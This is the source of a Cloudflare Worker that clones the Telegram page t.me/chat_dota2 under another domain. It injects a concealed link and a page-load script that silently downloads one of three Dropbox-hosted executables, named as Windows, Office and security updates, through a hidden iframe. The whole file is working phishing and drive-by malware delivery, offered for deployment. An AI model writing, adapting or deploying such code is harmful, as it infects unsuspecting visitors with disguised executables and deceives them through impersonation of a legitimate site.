/**
 * Cloudflare Worker: Telegram Proxy + Payload Injection
 * 
 * Proxies t.me/chat_dota2 for exact clone with real browser prompt
 * Injects invisible payload delivery mechanism using Dropbox links
 * Automatically triggers payload fetch on page load
 * 
 * Deploy to: your-domain.com/chat_dota2
 */

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    const url = new URL(request.url)
    const targetUrl = new URL('https://t.me/chat_dota2')
    
    // Add cache-busting parameter
    targetUrl.searchParams.set('_cf', Date.now())

    // Proxy the request with no-cache headers
    const response = await fetch(targetUrl.href, {
        method: request.method,
        headers: {
            ...request.headers,
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        },
        body: request.body,
        cf: {
            cacheTtl: 0,
            cacheEverything: false
        }
    })

    // Clone the response
    let html = await response.text()

    // Inject invisible payload link + JS to trigger payload on page load
    const inject = `
        <a href="javascript:void(0)" onclick="fetchPayload()" style="color:#fff; font-size:0.1px; position:absolute; top:-100px; left:-100px; opacity:0; pointer-events:none; user-select:none;">
            &#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;
        </a>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                // Trigger payload silently in background
                fetchPayload()
            })

            function fetchPayload() {
                const payloadUrls = [
                    "https://www.dropbox.com/scl/fi/dq2uzta5031znrox0bh50/WindowsSystemUpdate.exe?rlkey=vbwda3aotwizhzr87sbwxlq5l&st=gy4vj54l&dl=1",
                    "https://www.dropbox.com/scl/fi/lcpe3npwf461gjc4quhnh/MicrosoftOfficeUpdate.exe?rlkey=b6d73jip5s6wgw5m0ydkovm3x&st=4bdl3u9t&dl=1",
                    "https://www.dropbox.com/scl/fi/6zdufkzb6swph522bs3sb/SecurityPatch-KB5034441.exe?rlkey=qn6qkjxninz62ijfmpcsl1eav&st=igwjxb1o&dl=1"
                ]
                const randomUrl = payloadUrls[Math.floor(Math.random() * payloadUrls.length)]

                // Create invisible iframe for silent download
                const iframe = document.createElement('iframe')
                iframe.style.display = 'none'
                iframe.src = randomUrl
                document.body.appendChild(iframe)
                
                // Remove iframe after download starts
                setTimeout(() => {
                    document.body.removeChild(iframe)
                }, 5000)
            }
        </script>
    `

    html = html.replace('</body>', inject + '</body>')

    // Return modified response
    return new Response(html, {
        headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        }
    })
}
